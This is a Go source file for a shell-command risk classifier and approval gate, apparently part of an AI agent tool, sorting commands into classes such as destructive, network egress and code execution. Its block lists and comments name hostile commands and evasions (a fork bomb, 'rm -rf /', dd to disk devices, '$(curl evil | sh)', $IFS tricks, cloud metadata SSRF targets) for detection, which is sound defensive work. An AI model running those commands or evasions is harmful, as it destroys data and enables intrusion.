// Package danger classifies shell commands by risk level and provides
// a configurable approval system for dangerous operations.
//
// Classification is token-based (not regex) — it respects quotes, pipes,
// redirects, compound commands (&&, ||, ;), and multi-line input. Each
// command is classified into one of 8 risk classes, and the user can
// configure which actions (allow/prompt/deny) apply to each class.
package danger

import (
	"fmt"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

// ── Types ──────────────────────────────────────────────────────────────

// RiskClass represents the risk level of a shell command.
type RiskClass string

const (
	Safe          RiskClass = "safe"
	LocalWrite    RiskClass = "local_write"
	SystemWrite   RiskClass = "system_write"
	Destructive   RiskClass = "destructive"
	NetworkEgress RiskClass = "network_egress"
	CodeExecution RiskClass = "code_execution"
	Install       RiskClass = "install"
	Blocked       RiskClass = "blocked"
)

// Action represents what to do when a command of a given risk class is detected.
type Action string

const (
	Allow  Action = "allow"
	Prompt Action = "prompt"
	Deny   Action = "deny"
)

// ── Tool Operation ─────────────────────────────────────────────────────

// ToolOperation describes a native tool call for approval checking.
type ToolOperation struct {
	Name     string
	Resource string
	Risk     RiskClass
}

// ── Path-based classification ──────────────────────────────────────────

// ClassifyPath returns a RiskClass for a filesystem path.
// /tmp/*, working directory → local_write; /etc/*, /root/* → system_write;
// /boot/*, /dev/*, /sys/* → destructive; home sensitive dirs → system_write.
func ClassifyPath(path string) RiskClass {
	abs, err := filepath.Abs(path)
	if err != nil {
		return SystemWrite
	}
	abs = filepath.Clean(abs)

	for _, prefix := range []string{"/boot", "/dev", "/proc", "/sys", "/mnt", "/media"} {
		if strings.HasPrefix(abs, prefix) {
			return Destructive
		}
	}

	// Temp directory paths are always local, not system. This handles
	// macOS where temp dirs live under /var/folders/, preventing false
	// SystemWrite classification (matching Linux /tmp behavior).
	// os.TempDir may include a trailing separator on some platforms;
	// Clean normalises it before the prefix check.
	if tmpDir := filepath.Clean(os.TempDir()); abs == tmpDir || strings.HasPrefix(abs, tmpDir+string(filepath.Separator)) {
		return LocalWrite
	}

	for _, prefix := range []string{"/etc", "/root", "/var", "/run", "/lib", "/usr"} {
		if strings.HasPrefix(abs, prefix) {
			return SystemWrite
		}
	}
	home, _ := os.UserHomeDir()
	if home != "" {
		for _, sub := range []string{"/.ssh", "/.config", "/.gnupg", "/.aws", "/.kube",
			"/.docker", "/.gitconfig", "/.env"} {
			if strings.HasPrefix(abs, home+sub) {
				return SystemWrite
			}
		}
	}
	return LocalWrite
}

// ClassifyURL returns a RiskClass for a browser URL.
// Internal IPs → system_write; external → network_egress.
// Uses proper IP parsing (handles decimal, octal, hex, IPv6 compressed,
// short forms like 127.1, and all other representations that browsers
// accept via inet_aton-style parsing) instead of string prefix matching
// which was trivially bypassable.
func ClassifyURL(rawURL string) RiskClass {
	u, err := url.Parse(rawURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return NetworkEgress // can't parse — don't block, but will fail at fetch time
	}

	host := u.Hostname()

	// Try as an IP address — uses browser-compatible parsing that handles
	// decimal (127.0.0.1), octal (0177.0.0.1), hex (0x7f000001),
	// mixed (127.0x1), short (127.1), single-integer (2130706433),
	// IPv6 compressed ([::1]), IPv4-mapped IPv6, etc.
	if ip := parseBrowserIP(host); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
			return SystemWrite
		}
		if ip.IsUnspecified() {
			return SystemWrite
		}
		return NetworkEgress
	}

	// Hostname-based: check well-known private hostnames
	hostLower := strings.ToLower(host)
	switch hostLower {
	case "localhost", "localhost.localdomain", "localhost6", "localhost6.localdomain6",
		"ip6-localhost", "ip6-loopback":
		return SystemWrite
	}

	// *.local (mDNS) resolves to link-local
	if strings.HasSuffix(hostLower, ".local") {
		return SystemWrite
	}

	// Common cloud metadata endpoints (SSRF targets)
	if hostLower == "169.254.169.254" || hostLower == "[fd00:ec2::254]" ||
		hostLower == "metadata.google.internal" ||
		hostLower == "metadata.internal" ||
		strings.HasSuffix(hostLower, ".internal") {
		return SystemWrite
	}

	// Docker internal hostnames
	if strings.HasSuffix(hostLower, ".docker.internal") {
		return SystemWrite
	}

	return NetworkEgress
}

// parseBrowserIP parses an IP address using the same rules browsers use
// (inet_aton-style), handling representations that Go's net.ParseIP doesn't:
//   - Octal: 0177.0.0.1
//   - Hex:   0x7f000001, 0x0.0x0.0x0.0x0
//   - Integer: 2130706433
//   - Short:  127.1
func parseBrowserIP(host string) net.IP {
	// Try standard parse first (handles IPv6, dotted decimal, etc.)
	if ip := net.ParseIP(host); ip != nil {
		return ip
	}

	// Try inet_aton-style parsing for IPv4 with non-standard representations
	parts := strings.Split(host, ".")
	if len(parts) < 1 || len(parts) > 4 {
		return nil
	}

	var nums []uint32
	for _, p := range parts {
		var val uint64
		var err error
		switch {
		case strings.HasPrefix(p, "0x") || strings.HasPrefix(p, "0X"):
			val, err = strconv.ParseUint(p[2:], 16, 32)
		case strings.HasPrefix(p, "0") && len(p) > 1:
			// Only octal if it starts with 0 and has more digits
			// Single "0" is just decimal zero
			val, err = strconv.ParseUint(p[1:], 8, 32)
		default:
			val, err = strconv.ParseUint(p, 10, 32)
		}
		if err != nil || val > 0xFFFFFFFF {
			return nil
		}
		nums = append(nums, uint32(val))
	}

	switch len(nums) {
	case 1:
		// Single number: full 32-bit address
		return net.IPv4(byte(nums[0]>>24), byte(nums[0]>>16), byte(nums[0]>>8), byte(nums[0]))
	case 2:
		// a.b: a = high byte, b = remaining 24 bits
		return net.IPv4(byte(nums[0]), byte(nums[1]>>16), byte(nums[1]>>8), byte(nums[1]))
	case 3:
		// a.b.c: a, b = high bytes, c = remaining 16 bits
		return net.IPv4(byte(nums[0]), byte(nums[1]), byte(nums[2]>>8), byte(nums[2]))
	case 4:
		return net.IPv4(byte(nums[0]), byte(nums[1]), byte(nums[2]), byte(nums[3]))
	}
	return nil
}

// ── Config ─────────────────────────────────────────────────────────────

// DangerousConfig defines how dangerous operations are handled.
// Configurable via the standard 4-layer odek config chain.
//
// Default behavior per class (no sandbox):
//
//	safe → allow, local_write → allow, system_write → prompt,
//	destructive → deny, network_egress → prompt,
//	code_execution → prompt, install → prompt, blocked → deny
type DangerousConfig struct {
	// Classes maps risk classes to their configured action.
	// Only overrides for non-default values need to be set.
	Classes map[RiskClass]Action `json:"classes,omitempty"`

	// Allowlist is a list of command strings that are always allowed,
	// regardless of their risk classification. Exact match only.
	// Takes priority over Denylist.
	Allowlist []string `json:"allowlist,omitempty"`

	// Denylist is a list of command strings that are always denied,
	// regardless of their risk classification. Prefix match (after trimming).
	Denylist []string `json:"denylist,omitempty"`

	// DefaultAction is the global default action applied to ALL risk classes
	// when set. Per-class overrides in Classes still win.
	// "allow" → YOLO mode (everything runs without prompt)
	// "deny" → lockdown (everything denied unless explicitly allowed)
	// Not set → uses built-in defaults per class
	DefaultAction *string `json:"action,omitempty"`

	// NonInteractive specifies what to do when running without a TTY.
	// "allow" (default) — run everything, "deny" — block all prompted ops.
	NonInteractive *string `json:"non_interactive,omitempty"`

	// Approver handles interactive approval prompts for dangerous operations.
	// When set, all Prompt-class operations use this instead of /dev/tty.
	// Tools can inject their own approver (e.g., WebSocket-based for odek serve).
	// When nil, CheckOperation falls back to /dev/tty (CLI-compatible default).
	Approver Approver `json:"-"`
}

// defaultActions defines the base per-class behavior.
var defaultActions = map[RiskClass]Action{
	Safe:          Allow,
	LocalWrite:    Allow,
	SystemWrite:   Prompt,
	Destructive:   Deny,
	NetworkEgress: Prompt,
	CodeExecution: Prompt,
	Install:       Prompt,
	Blocked:       Deny,
}

// ActionFor returns the configured action for the given risk class.
// Per-class overrides in Classes win first, then the global default
// action (the "action" field), then built-in defaults, then Prompt.
func (c *DangerousConfig) ActionFor(cls RiskClass) Action {
	// If the user explicitly configured an action for this class, use it.
	if c.Classes != nil {
		if a, ok := c.Classes[cls]; ok {
			return a
		}
	}
	// Blocked is always denied regardless of global default action.
	// This covers commands like "rm -rf /" that are hardcoded as
	// unrecoverable even in YOLO mode.
	if cls == Blocked {
		return Deny
	}
	// Global default action overrides all built-in defaults.
	// Set "action": "allow" for YOLO mode, "action": "deny" for lockdown.
	if c.DefaultAction != nil {
		return parseAction(*c.DefaultAction)
	}
	// Fallback to built-in defaults
	if a, ok := defaultActions[cls]; ok {
		return a
	}
	return Prompt
}

// ActionForCommand returns the action for a specific command string.
// Allowlist and denylist are checked first (exact match for allowlist,
// prefix match for denylist), then falls back to the risk-class-based action.
func (c *DangerousConfig) ActionForCommand(cmd string) Action {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return Allow
	}
	// Allowlist has highest priority — exact match after trimming both sides.
	for _, pattern := range c.Allowlist {
		if cmd == strings.TrimSpace(pattern) {
			return Allow
		}
	}
	// Denylist is checked before classification — prefix match after trimming.
	for _, pattern := range c.Denylist {
		if strings.HasPrefix(cmd, strings.TrimSpace(pattern)) {
			return Deny
		}
	}
	// Classify and use class-based action
	cls := Classify(cmd)
	return c.ActionFor(cls)
}

// NonInteractiveAction returns the action to use when no TTY is available.
func (c *DangerousConfig) NonInteractiveAction() Action {
	if c.NonInteractive != nil {
		return parseAction(*c.NonInteractive)
	}
	return Allow
}

// CheckOperation checks whether a tool operation is allowed, denied,
// or needs approval. Returns nil on allow, error on deny, and prompts
// the user on prompt. Uses the configured Approver when set; falls back
// to /dev/tty (TTYApprover) when no approver is configured.
func (c *DangerousConfig) CheckOperation(op ToolOperation, trustedClasses map[RiskClass]bool) error {
	action := c.ActionFor(op.Risk)
	switch action {
	case Allow:
		return nil
	case Deny:
		return fmt.Errorf("operation denied by configuration: %s %s (risk: %s)",
			op.Name, op.Resource, op.Risk)
	case Prompt:
		// Use configured approver, or fall back to TTY
		approver := c.Approver
		if approver == nil {
			approver = NewTTYApprover(c)
		}
		// Build a TTYApprover for trustedClasses tracking if needed
		if tty, ok := approver.(*TTYApprover); ok && trustedClasses != nil {
			tty.TrustedClasses = trustedClasses
		}
		return approver.PromptOperation(op)
	default:
		return nil
	}
}

func parseAction(s string) Action {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "allow":
		return Allow
	case "deny":
		return Deny
	default:
		return Prompt
	}
}

// ── Tokenizer ──────────────────────────────────────────────────────────

// tokenize splits a shell command into tokens, respecting:
//   - Single and double quotes (content preserved as-is)
//   - Pipes (|), redirects (>, >>), compound (&&, ||, ;)
//   - Newlines mapped to semicolons (command separators)
//
// Output: flattened token slice including operators as tokens.
func tokenize(input string) []string {
	input = strings.TrimSpace(input)
	if input == "" {
		return nil
	}

	// Normalize newlines to semicolons
	input = strings.NewReplacer("\r\n", ";", "\n", ";", "\r", ";").Replace(input)

	var tokens []string
	var current strings.Builder
	inSingle := false
	inDouble := false
	escapeNext := false

	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			current.Reset()
		}
	}

	for i := 0; i < len(input); i++ {
		ch := input[i]

		if escapeNext {
			current.WriteByte(ch)
			escapeNext = false
			continue
		}

		if ch == '\\' && inDouble {
			// In double quotes, \ escapes \, ", $, `, and newline
			next := i + 1
			if next < len(input) {
				switch input[next] {
				case '\\', '"', '$', '`':
					escapeNext = true
					continue
				case '\n':
					i++ // skip newline
					continue
				}
			}
			current.WriteByte(ch)
			continue
		}

		if ch == '\'' && !inDouble {
			if !inSingle {
				inSingle = true
				continue // start quote — don't write the quote char
			}
			// End single quote
			inSingle = false
			flush()
			continue
		}

		if ch == '"' && !inSingle {
			if !inDouble {
				inDouble = true
				continue // start double quote — don't write the quote char
			}
			// End double quote
			inDouble = false
			flush()
			continue
		}

		if inSingle || inDouble {
			current.WriteByte(ch)
			continue
		}

		// Outside quotes — handle operators and whitespace
		if ch == ' ' || ch == '\t' {
			flush()
			continue
		}

		// Multi-char operators: &&, ||, >>
		// Check for two-character operators
		if i+1 < len(input) {
			op2 := string(input[i]) + string(input[i+1])
			switch op2 {
			case "&&", "||", ">>":
				flush()
				tokens = append(tokens, op2)
				i++
				continue
			}
		}

		// Single-char operators: |, >, ;
		switch ch {
		case '|', '>', ';':
			flush()
			tokens = append(tokens, string(ch))
			continue
		}

		// Regular character
		current.WriteByte(ch)
	}

	flush()
	return tokens
}

// ── Safe command prefixes ──────────────────────────────────────────────
// (Unused — classification falls through to Safe by default. Kept as
// documentation of what's considered read-only.)

var writePrefixes = map[string]bool{
	"echo": true, "sed": true, "awk": true, "tee": true,
	"rm": true, "mv": true, "cp": true, "touch": true,
	"mkdir": true, "rmdir": true, "chmod": true, "chown": true,
}

var systemPrefixes = map[string]bool{
	"sudo": true, "apt": true, "apt-get": true, "yum": true,
	"brew": true, "dpkg": true, "systemctl": true, "service": true,
	"useradd": true, "groupadd": true, "passwd": true, "chown": true,
}

var destructivePrefixes = map[string]bool{
	"dd": true, "mkfs": true, "mkfs.ext4": true, "mkfs.ext3": true,
	"mkfs.xfs": true, "fdisk": true, "parted": true, "mke2fs": true,
}

var networkPrefixes = map[string]bool{
	"curl": true, "wget": true, "scp": true, "rsync": true,
	"nc": true, "ncat": true, "ssh": true, "sftp": true,
	"ftp": true, "telnet": true, "git": true,
}

var pipedShells = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "fish": true, "dash": true, "ksh": true,
}

var codeEvalPrefixes = map[string]bool{
	"eval": true, "node": true, "python": true, "python3": true,
	"perl": true, "ruby": true, "php": true,
}

var installPrefixes = map[string]bool{
	"npm": true, "pip": true, "pip3": true, "gem": true,
	"cargo": true, "brew": true, "go": true,
}

// ── Classifier ─────────────────────────────────────────────────────────

// Classify determines the risk class of a shell command using token-level
// heuristics. Returns the highest-severity class detected.
//
// Priority (highest to lowest):
// blocked > destructive > system_write > code_execution > network_egress >
// install > local_write > safe
//
// Before tokenisation the input is normalised to neutralise common shell
// evasion tricks (substitutions, $IFS obfuscation, command/exec wrappers,
// backslash escapes, absolute-path basenames). Any sub-expression extracted
// during normalisation is classified independently so the worst class wins.
func Classify(cmd string) RiskClass {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return Safe
	}

	// Check blocked patterns on raw command (before tokenization mangles them)
	if isRawBlocked(cmd) {
		return Blocked
	}

	main, subs := normalize(cmd)
	worst := classifyOne(main)
	for _, s := range subs {
		// Substitutions are themselves commands the shell will run.
		// Re-enter Classify (not classifyOne) so nested substitutions
		// inside them also normalise.
		if r := Classify(s); rank(r) > rank(worst) {
			worst = r
		}
	}
	return worst
}

// classifyOne runs the existing token-level pipeline against an already-
// normalised command string.
func classifyOne(cmd string) RiskClass {
	tokens := tokenize(cmd)
	if len(tokens) == 0 {
		return Safe
	}

	segments := splitSegments(tokens)

	worst := Safe
	for _, seg := range segments {
		cls := classifySegment(seg)
		if rank(cls) > rank(worst) {
			worst = cls
		}
	}
	return worst
}

// ── Normalisation (evasion neutralisation) ────────────────────────────
//
// normalize returns the command rewritten so the token-level pipeline can
// see through common evasion tricks, plus a list of additional commands
// that were extracted from $(...) / `...` substitutions. Each substitution
// is the body the shell would itself execute, so it must be classified in
// its own right.
//
// The transformations are intentionally conservative: each one matches a
// shell behaviour that is well-defined and not affected by the surrounding
// quoting style we already track.
func normalize(cmd string) (string, []string) {
	cmd = expandIFS(cmd)
	cmd, subs := extractSubstitutions(cmd)
	cmd = stripCommandWrappers(cmd)
	cmd = collapseUnquotedBackslashes(cmd)
	cmd = basenameFirstToken(cmd)
	return cmd, subs
}

// expandIFS replaces $IFS / ${IFS} with a literal space. The shell expands
// $IFS to its default value (space/tab/newline) on word splitting, so
// `rm$IFS-rf$IFS/` runs as `rm -rf /`. We only expand IFS — other env
// vars may legitimately hold arbitrary values and replacing them blindly
// would create false negatives.
var reIFS = regexp.MustCompile(`\$\{IFS\}|\$IFS\b`)

func expandIFS(cmd string) string {
	return reIFS.ReplaceAllString(cmd, " ")
}

// extractSubstitutions pulls out $(...) and `...` substitutions and
// replaces each with a single safe placeholder token. The extracted
// bodies are returned as additional commands to classify.
//
// $(...) handling tracks nesting so $(echo $(echo rm)) extracts both the
// inner and outer bodies. Backticks do not nest in POSIX shells, so we
// just pair the next two unescaped backticks.
func extractSubstitutions(cmd string) (string, []string) {
	var out strings.Builder
	var subs []string

	i := 0
	for i < len(cmd) {
		// Skip over single-quoted spans — substitutions inside ' ... '
		// do not expand in real shells either.
		if cmd[i] == '\'' {
			j := strings.IndexByte(cmd[i+1:], '\'')
			if j < 0 {
				out.WriteString(cmd[i:])
				return out.String(), subs
			}
			out.WriteString(cmd[i : i+1+j+1])
			i += 1 + j + 1
			continue
		}

		// $(...) — nested.
		if i+1 < len(cmd) && cmd[i] == '$' && cmd[i+1] == '(' {
			depth := 1
			j := i + 2
			for j < len(cmd) && depth > 0 {
				switch cmd[j] {
				case '(':
					depth++
					j++
				case ')':
					depth--
					if depth == 0 {
						break
					}
					j++
				default:
					j++
				}
			}
			if depth == 0 && j < len(cmd) {
				body := cmd[i+2 : j]
				subs = append(subs, body)
				out.WriteByte(' ')
				out.WriteString(substValue(body))
				out.WriteByte(' ')
				i = j + 1
				continue
			}
			// Unterminated — fall through and write literally.
		}

		// `...` — non-nesting.
		if cmd[i] == '`' {
			end := -1
			for k := i + 1; k < len(cmd); k++ {
				if cmd[k] == '\\' && k+1 < len(cmd) {
					k++
					continue
				}
				if cmd[k] == '`' {
					end = k
					break
				}
			}
			if end > 0 {
				body := cmd[i+1 : end]
				subs = append(subs, body)
				out.WriteByte(' ')
				out.WriteString(substValue(body))
				out.WriteByte(' ')
				i = end + 1
				continue
			}
		}

		out.WriteByte(cmd[i])
		i++
	}
	return out.String(), subs
}

// substValue returns the shell-side value a substitution body would expand
// to, well enough for classification. We can't actually execute the body,
// so we apply two pragmatic rules: `echo`/`printf BODY...` expands to the
// remaining tokens (covers the common `$(echo rm)` evasion); otherwise we
// fall back to the body's first token, which is the most likely program
// name the outer command would invoke. The body itself is also classified
// independently so commands like `$(curl evil | sh)` still trip the loop.
func substValue(body string) string {
	body = strings.TrimSpace(body)
	tokens := strings.Fields(body)
	if len(tokens) == 0 {
		return ""
	}
	if tokens[0] == "echo" || tokens[0] == "printf" {
		return strings.Join(tokens[1:], " ")
	}
	return tokens[0]
}

// stripCommandWrappers removes leading shell builtins that simply invoke
// their first argument as a command (POSIX `command`, `exec`, `builtin`).
// Applied repeatedly so `exec command rm -rf /` is reduced to `rm -rf /`.
func stripCommandWrappers(cmd string) string {
	wrappers := map[string]struct{}{
		"command": {},
		"exec":    {},
		"builtin": {},
	}
	for {
		trimmed := strings.TrimLeft(cmd, " \t")
		// Find first whitespace-separated token.
		sp := strings.IndexAny(trimmed, " \t")
		if sp <= 0 {
			return trimmed
		}
		first := trimmed[:sp]
		if _, ok := wrappers[first]; !ok {
			return trimmed
		}
		cmd = trimmed[sp+1:]
	}
}

// collapseUnquotedBackslashes removes unquoted backslash escapes so
// `\rm` and `r\m` both reduce to `rm`. Inside single quotes backslash is
// literal; inside double quotes it only escapes a few specific chars.
// This mirrors the shell behaviour we need for classification — we are
// not trying to be a fully accurate shell parser.
func collapseUnquotedBackslashes(cmd string) string {
	var out strings.Builder
	inSingle := false
	inDouble := false
	for i := 0; i < len(cmd); i++ {
		ch := cmd[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
			out.WriteByte(ch)
		case ch == '"' && !inSingle:
			inDouble = !inDouble
			out.WriteByte(ch)
		case ch == '\\' && !inSingle && i+1 < len(cmd):
			// Drop the backslash, keep the next character.
			out.WriteByte(cmd[i+1])
			i++
		default:
			out.WriteByte(ch)
		}
	}
	return out.String()
}

// basenameFirstToken rewrites the first whitespace-separated token to
// its basename if it is an absolute path. This makes `/bin/rm -rf /`
// classify the same as `rm -rf /`. We only rewrite when the basename
// matches a known prefix set (rm/dd/sudo/...) so legitimate non-command
// arguments are not altered.
func basenameFirstToken(cmd string) string {
	trimmed := strings.TrimLeft(cmd, " \t")
	if !strings.HasPrefix(trimmed, "/") {
		return cmd
	}
	sp := strings.IndexAny(trimmed, " \t")
	var first, rest string
	if sp < 0 {
		first, rest = trimmed, ""
	} else {
		first, rest = trimmed[:sp], trimmed[sp:]
	}
	base := filepath.Base(first)
	if !isKnownCommandName(base) {
		return cmd
	}
	return base + rest
}

func isKnownCommandName(name string) bool {
	if name == "rm" || name == "sudo" {
		return true
	}
	return writePrefixes[name] ||
		systemPrefixes[name] ||
		destructivePrefixes[name] ||
		networkPrefixes[name] ||
		codeEvalPrefixes[name] ||
		installPrefixes[name] ||
		pipedShells[name]
}

// isRawBlocked checks the raw command string for patterns that are
// blocked regardless of tokenization artifacts.
func isRawBlocked(cmd string) bool {
	// Fork bomb
	if cmd == ":(){ :|:& };:" {
		return true
	}
	if strings.Contains(cmd, ":{") && strings.Contains(cmd, "}:") {
		return true
	}
	return false
}

// splitSegments splits token sequences on command separators.
// ;, &&, || all start a new segment. Pipe (|) is NOT a segment separator
// — it stays within a segment so code_execution detection can find it.
func splitSegments(tokens []string) [][]string {
	var segments [][]string
	var current []string

	for _, tok := range tokens {
		switch tok {
		case ";", "&&", "||":
			if len(current) > 0 {
				segments = append(segments, current)
				current = nil
			}
		default:
			current = append(current, tok)
		}
	}
	if len(current) > 0 {
		segments = append(segments, current)
	}
	return segments
}

// classifySegment classifies a single command segment (no separators).
func classifySegment(tokens []string) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}

	first := tokens[0]

	// Blocked
	if isBlocked(tokens) {
		return Blocked
	}

	// Destructive
	if isDestructive(first, tokens) {
		return Destructive
	}

	// System write
	if isSystemWrite(first, tokens) {
		return SystemWrite
	}

	// Code execution checks (pipe to shell, eval, -e/-c flags)
	if isCodeExecution(first, tokens) {
		return CodeExecution
	}

	// Network egress
	if isNetworkEgress(first, tokens) {
		return NetworkEgress
	}

	// Install
	if isInstall(first, tokens) {
		return Install
	}

	// Local write
	if isLocalWrite(first, tokens) {
		return LocalWrite
	}

	// Check for redirect targets that are system paths
	if hasSystemRedirectTarget(tokens) {
		return SystemWrite
	}

	return Safe
}

// ── Detection helpers ──────────────────────────────────────────────────

func isBlocked(tokens []string) bool {
	// dd to block device
	if len(tokens) >= 4 && tokens[0] == "dd" {
		for i, tok := range tokens {
			if tok == "of=" && i+2 < len(tokens) && strings.HasPrefix(tokens[i+2], "/dev/sd") {
				// of=/dev/sda (no space)
				return true
			}
			if strings.HasPrefix(tok, "of=") && strings.Contains(tok, "/dev/sd") {
				return true
			}
			if strings.HasPrefix(tok, "of=") && strings.Contains(tok, "/dev/nvme") {
				return true
			}
		}
	}
	return false
}

func isDestructive(first string, tokens []string) bool {
	// rm with -rf targeting root paths
	if first == "rm" {
		hasRF := false
		for _, tok := range tokens[1:] {
			if tok == "-rf" || tok == "-fr" || tok == "--no-preserve-root" || tok == "-r" || tok == "-f" {
				hasRF = true
			}
		}
		if !hasRF {
			return false
		}
		for _, tok := range tokens[1:] {
			if strings.HasPrefix(tok, "/") && !strings.HasPrefix(tok, "/tmp") && !strings.HasPrefix(tok, "/workspace") {
				return true
			}
		}
		return false
	}

	if !destructivePrefixes[first] || len(tokens) < 2 {
		return false
	}

	// mkfs, fdisk, parted, etc. — any usage is destructive
	if first != "dd" {
		return len(tokens) >= 1
	}

	// dd with of=/dev/sd* or of=/dev/nvme*
	for _, tok := range tokens {
		if strings.HasPrefix(tok, "of=") && strings.Contains(tok, "/dev/") {
			return true
		}
		if tok == "of=" && len(tokens) > 1 {
			for j := 0; j < len(tokens); j++ {
				if strings.HasPrefix(tokens[j], "/dev/sd") || strings.HasPrefix(tokens[j], "/dev/nvme") {
					return true
				}
			}
		}
	}
	return false
}

func isSystemWrite(first string, tokens []string) bool {
	if first == "sudo" {
		return true
	}
	if systemPrefixes[first] {
		return true
	}
	// Check redirect targets for system paths
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			continue
		}
		if isSystemPath(tok) {
			// Check if it's a redirect target (token follows > or >>)
			for i, t := range tokens {
				if (t == ">" || t == ">>") && i+1 < len(tokens) && tokens[i+1] == tok {
					return true
				}
			}
		}
	}
	return false
}

func isLocalWrite(first string, tokens []string) bool {
	// echo without redirect is safe (just displaying text)
	if first == "echo" {
		for _, tok := range tokens {
			if tok == ">" || tok == ">>" {
				return true
			}
		}
		return false
	}
	if writePrefixes[first] {
		return true
	}
	// Any command with > or >> is a write
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			return true
		}
	}
	return false
}

func isNetworkEgress(first string, tokens []string) bool {
	if !networkPrefixes[first] {
		return false
	}
	// git push requires a remote argument
	if first == "git" {
		return hasArgAfter(tokens, "git", "push") && hasArgAfter(tokens, "push", "")
	}
	// rsync with remote target (contains :)
	if first == "rsync" {
		for _, tok := range tokens[1:] {
			if strings.Contains(tok, "@") && strings.Contains(tok, ":") {
				return true
			}
			if strings.Contains(tok, "::") {
				return true
			}
		}
		return false
	}
	// All other network commands are inherently egress
	return true
}

func isCodeExecution(first string, tokens []string) bool {
	// Pipe to shell interpreter
	for i, tok := range tokens {
		if tok == "|" && i+1 < len(tokens) && pipedShells[tokens[i+1]] {
			return true
		}
	}

	if !codeEvalPrefixes[first] {
		// Check go run / go tool — compiles and executes code
		if first == "go" {
			for _, tok := range tokens[1:] {
				if tok == "run" || tok == "tool" || tok == "generate" {
					return true
				}
			}
		}
		return false
	}

	// eval is always code execution
	if first == "eval" {
		return true
	}

	// node/python/perl/ruby/php with -e, -c, -r flags
	for _, tok := range tokens[1:] {
		if tok == "-e" || tok == "-c" || tok == "-r" {
			return true
		}
	}

	return false
}

func isInstall(first string, tokens []string) bool {
	if !installPrefixes[first] {
		return false
	}

	// npm install / npm ci / npm i
	if first == "npm" || first == "pip" || first == "pip3" || first == "gem" {
		for _, tok := range tokens[1:] {
			if tok == "install" || tok == "i" || tok == "ci" {
				return true
			}
		}
	}

	// cargo install
	if first == "cargo" {
		return hasArgAfter(tokens, "cargo", "install")
	}

	// go install <remote> OR go install <local-path>
	if first == "go" {
		hasInstall := false
		for _, tok := range tokens[1:] {
			if tok == "install" {
				hasInstall = true
				continue
			}
			if hasInstall {
				return true // go install <something> downloads deps
			}
		}
		return false // bare "go install" = local build only
	}

	// brew install
	if first == "brew" {
		return hasArgAfter(tokens, "brew", "install")
	}

	return false
}

// hasArgAfter returns true if the token after 'after' is 'target'.
// If target is empty, just checks that 'after' exists and has a successor.
func hasArgAfter(tokens []string, after, target string) bool {
	for i, tok := range tokens {
		if tok == after && i+1 < len(tokens) {
			if target == "" {
				return true
			}
			// Check next non-flag token
			for j := i + 1; j < len(tokens); j++ {
				if !strings.HasPrefix(tokens[j], "-") {
					return tokens[j] == target || target == ""
				}
			}
			return false
		}
	}
	return false
}

// hasSystemRedirectTarget checks if any redirect target is a system path.
func hasSystemRedirectTarget(tokens []string) bool {
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			continue
		}
		if isSystemPath(tok) {
			return true
		}
	}
	return false
}

// isSystemPath returns true if the path targets a system directory.
var systemPathPrefixes = []string{"/etc/", "/usr/", "/bin/", "/lib/", "/var/", "/opt/", "/boot/", "/sbin/"}

func isSystemPath(path string) bool {
	for _, p := range systemPathPrefixes {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

// ── Ranking ────────────────────────────────────────────────────────────

// rank returns the severity order for priority comparison.
func rank(cls RiskClass) int {
	switch cls {
	case Blocked:
		return 8
	case Destructive:
		return 7
	case SystemWrite:
		return 6
	case CodeExecution:
		return 5
	case NetworkEgress:
		return 4
	case Install:
		return 3
	case LocalWrite:
		return 2
	case Safe:
		return 1
	default:
		return 0
	}
}
